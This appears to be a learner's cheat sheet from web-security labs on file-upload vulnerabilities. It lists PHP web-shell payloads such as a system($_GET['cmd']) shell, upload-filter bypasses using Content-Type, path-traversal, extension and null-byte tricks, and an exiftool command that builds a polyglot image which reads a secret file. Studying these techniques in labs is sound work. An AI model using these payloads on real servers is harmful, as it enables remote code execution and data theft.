

	<File upload vulnerabilities>
	
		+ Remote code execution via web shell upload (without restrict) -> create own php/python languages for uploading to bypass strict upload types. 
																			after successful upload, click COPY IMAGE LINK.
				<?php 	echo system(id);   	?>
				<?php	echo phpinfo();	  	?>
				<?php 	exec("ls -la"); 	?>
							
				<?php system($_GET['cmd']); ?>  		http://10.0.0.130/cmd.php?cmd=ifconfig

				
		
		+ Web shell upload via Content-Type restriction bypass -> change the content-type while uploading the payload.
		+ Web shell upload via path traversal -> sometime payload/script will run as text files. but need encode (/) slash as %2f before the FILE of code or .php 
				and modify code accordingly 
				
		+ Web shell upload via extension blacklist bypass -> 
						Change the value of the filename parameter to .htaccess/phtml  of .php file 
						Change the value of the Content-Type header to text/plain 
						
		+ Web shell upload via obfuscated file extension -> some alternative extensions that can be used to get around blacklist filters.
						payload.php%00.jpg OR payload.php\x00.jpg
						php.txt, .sh, .pht, .phtml, .phP, .Php, .php7, .php%00.jpeg, .cgi
						

		+ Remote code execution via polyglot web shell upload -> Create a polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata.		
						magic number images (google search)
						exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
						
						
		+ Web shell upload via race condition -> 
		
		
		
		
						
				
		
		